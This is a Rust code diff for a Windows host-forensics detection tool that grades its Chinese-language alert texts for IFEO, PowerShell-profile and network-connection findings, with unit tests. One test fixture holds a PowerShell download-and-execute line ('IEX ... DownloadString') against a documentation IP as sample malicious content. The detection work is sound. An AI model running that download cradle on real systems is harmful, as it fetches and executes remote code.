@@ -21,6 +21,10 @@ use cairn_core::analyzers;
 use cairn_core::finding::{Finding, FindingSource, Severity};
 use cairn_core::Mechanism;
 
+fn is_high(s: Severity) -> bool {
+    matches!(s, Severity::Critical | Severity::High)
+}
+
 fn is_medium_or_above(s: Severity) -> bool {
     matches!(s, Severity::Critical | Severity::High | Severity::Medium)
 }
@@ -157,16 +161,26 @@ fn persistence_client_text(host: &str, f: &Finding, now: DateTime<Utc>) -> Strin
         Mechanism::Winlogon => format!(
             "主機 {host} 上，Winlogon {value_name} 設定為 {bin}（{timing}），若非預期值請立即調查。"
         ),
-        Mechanism::Ifeo => format!(
+        Mechanism::Ifeo if is_high(f.severity) => format!(
             "主機 {host} 上，{key_leaf} 的 IFEO Debugger 被設定為 {bin}，此手法幾乎僅用於攻擊，建議立即調查。"
+        ),
+        Mechanism::Ifeo => format!(
+            "主機 {host} 上，{key_leaf} 的 IFEO Debugger 被設定為 {bin}（{timing}）。部分偵錯或系統工具\
+             （例如以 Process Explorer 取代工作管理員）也會這樣設定，但攻擊者也會用它攔截程式啟動；\
+             建議確認是否為已知且授權的設定。"
         ),
         Mechanism::WmiSubscription => format!(
             "主機 {host} 上偵測到 WMI 事件訂閱 {value_name}，會在特定事件發生時自動執行指令或腳本；\
              一般電腦很少有這類設定，建議立即調查。"
         ),
-        Mechanism::PsProfile => format!(
+        Mechanism::PsProfile if is_high(f.severity) => format!(
             "主機 {host} 上的 PowerShell 設定檔 {bin} 會在每次開啟 PowerShell 時執行，\
              內容含有下載或編碼指令，建議立即調查。"
+        ),
+        Mechanism::PsProfile => format!(
+            "主機 {host} 上的 PowerShell 設定檔 {bin} 會在每次開啟 PowerShell 時執行，\
+             內容含有網址（未見下載或編碼指令）。這可能只是代理伺服器或模組來源設定，\
+             建議確認內容是否為使用者或 IT 自行加入。"
         ),
         other => format!(
             "主機 {host} 上，{bin} 透過「{}」設定為自動執行（{timing}），建議確認該項目是否為已知且授權的軟體。",
@@ -175,7 +189,9 @@ fn persistence_client_text(host: &str, f: &Finding, now: DateTime<Utc>) -> Strin
     }
 }
 
-/// zh-TW sentence for network-connection findings, naming the owning process.
+/// zh-TW sentence for network-connection findings, naming the owning process and the
+/// direction: an outbound connection, an inbound session to an exposed remote-access
+/// service (netconn tags those T1133), or a listening socket.
 fn netconn_client_text(host: &str, f: &Finding) -> String {
     let proc_name = f
         .entity
@@ -195,6 +211,28 @@ fn netconn_client_text(host: &str, f: &Finding) -> String {
             )
         })
         .unwrap_or_else(|| "未知目標".to_owned());
+    let conn = f.entity.netconn.as_ref();
+    let listening = conn.is_some_and(|c| {
+        c.rport.unwrap_or(0) == 0
+            || c.raddr
+                .as_deref()
+                .is_none_or(|r| matches!(r, "" | "0.0.0.0" | "::" | "*" | "-"))
+    });
+    let inbound = f.mitre.iter().any(|m| m == "T1133");
+    if listening {
+        let lport = conn.map(|c| c.lport).unwrap_or(0);
+        return format!(
+            "主機 {host} 上，{proc_name} 正在監聽連接埠 {lport}，等待外部連入，\
+             建議確認這個程式是否應該對外提供服務。"
+        );
+    }
+    if inbound {
+        let lport = conn.map(|c| c.lport).unwrap_or(0);
+        return format!(
+            "主機 {host} 上，有來自 {remote} 的外部連線連入本機連接埠 {lport}（由 {proc_name} 接收），\
+             代表這項遠端服務直接暴露在網際網路上；建議確認連線來源是否為已知人員，並評估是否應關閉對外存取。"
+        );
+    }
     format!(
         "主機 {} 上，{} 發起了對外連線至 {}，建議確認連線目標是否屬於正常業務範疇。",
         host, proc_name, remote
@@ -578,6 +616,44 @@ mod tests {
         assert!(text.contains("幾乎僅用於攻擊"), "{text}");
     }
 
+    /// Process Explorer replacing Task Manager is the textbook benign IFEO Debugger;
+    /// whatever severity persist gives it, the text must match that severity.
+    #[test]
+    fn ifeo_text_is_graded_by_severity() {
+        let findings = cairn_heur::PersistHeuristic
+            .analyze(
+                &[Record::Persistence(prec(
+                    Mechanism::Ifeo,
+                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe",
+                    Some("taskmgr.exe"),
+                    r"C:\Users\a\AppData\Local\Sysinternals\procexp64.exe",
+                    Some(true),
+                    None,
+                ))],
+                &[],
+            )
+            .unwrap();
+        assert_eq!(findings.len(), 1);
+        let mut f = findings.into_iter().next().unwrap();
+        f.host = "WS01".into();
+        fill_details_client(&mut f, run_time());
+        let text = f.details_client.clone().unwrap();
+        assert_eq!(
+            text.contains("幾乎僅用於攻擊"),
+            matches!(f.severity, Severity::High | Severity::Critical),
+            "{:?}: {text}",
+            f.severity
+        );
+        // And the Medium wording itself, independent of persist's grading.
+        let mut m = f.clone();
+        m.severity = Severity::Medium;
+        m.details_client = None;
+        fill_details_client(&mut m, run_time());
+        let text = m.details_client.unwrap();
+        assert!(text.contains("Process Explorer"), "{text}");
+        assert!(!text.contains("幾乎僅用於攻擊"), "{text}");
+    }
+
     #[test]
     fn real_winlogon_finding_mentions_value() {
         let text = persist_text(prec(
@@ -682,6 +758,93 @@ mod tests {
         let text = f.details_client.unwrap();
         assert!(text.contains("beacon.exe"), "must name process: {text}");
         assert!(text.contains("185.0.0.1:4444"), "{text}");
+    }
+
+    fn netconn_text(conn: cairn_core::record::NetConnRecord, owner: ProcessRecordT) -> String {
+        let records = [Record::NetConn(conn), Record::Process(owner)];
+        let mut findings = cairn_heur::NetConnHeuristic.analyze(&records, &[]).unwrap();
+        assert_eq!(findings.len(), 1, "{findings:?}");
+        let mut f = findings.remove(0);
+        f.host = "WS01".into();
+        fill_details_client(&mut f, run_time());
+        f.details_client.unwrap()
+    }
+
+    type ProcessRecordT = cairn_core::record::ProcessRecord;
+
+    fn owner_proc(image: &str, signed: Option<bool>) -> ProcessRecordT {
+        ProcessRecordT {
+            pid: 7,
+            ppid: 4,
+            image: image.into(),
+            cmdline: String::new(),
+            signed,
+            signer: None,
+            binary_sha256: None,
+            integrity: None,
+            user: None,
+            start_time: None,
+            signer_source: None,
+        }
+    }
+
+    #[test]
+    fn netconn_text_says_inbound_for_an_exposed_rdp_session() {
+        let text = netconn_text(
+            cairn_core::record::NetConnRecord {
+                proto: "tcp".into(),
+                laddr: "10.0.0.5".into(),
+                lport: 3389,
+                raddr: Some("45.33.32.156".into()),
+                rport: Some(51234),
+                state: Some("established".into()),
+                pid: Some(7),
+            },
+            owner_proc(r"C:\Windows\System32\svchost.exe", Some(true)),
+        );
+        assert!(text.contains("連入本機連接埠 3389"), "{text}");
+        assert!(!text.contains("發起了對外連線"), "{text}");
+    }
+
+    #[test]
+    fn netconn_text_says_listening_for_a_listener() {
+        let text = netconn_text(
+            cairn_core::record::NetConnRecord {
+                proto: "tcp".into(),
+                laddr: "0.0.0.0".into(),
+                lport: 4444,
+                raddr: Some("0.0.0.0".into()),
+                rport: Some(0),
+                state: Some("listen".into()),
+                pid: Some(7),
+            },
+            owner_proc(r"C:\Users\a\AppData\Local\Temp\x.exe", Some(false)),
+        );
+        assert!(text.contains("正在監聽連接埠 4444"), "{text}");
+        assert!(!text.contains("發起了對外連線"), "{text}");
+    }
+
+    #[test]
+    fn ps_profile_text_matches_what_was_found() {
+        let text = persist_text(prec(
+            Mechanism::PsProfile,
+            r"C:\Users\a\Documents\WindowsPowerShell\profile.ps1",
+            None,
+            "[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy('http://proxy.corp:8080')",
+            None,
+            None,
+        ));
+        assert!(text.contains("含有網址"), "{text}");
+        assert!(!text.contains("下載或編碼指令，建議立即調查"), "{text}");
+        let text = persist_text(prec(
+            Mechanism::PsProfile,
+            r"C:\Users\a\Documents\WindowsPowerShell\profile.ps1",
+            None,
+            "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
+            None,
+            None,
+        ));
+        assert!(text.contains("下載或編碼指令"), "{text}");
     }
 
     #[test]
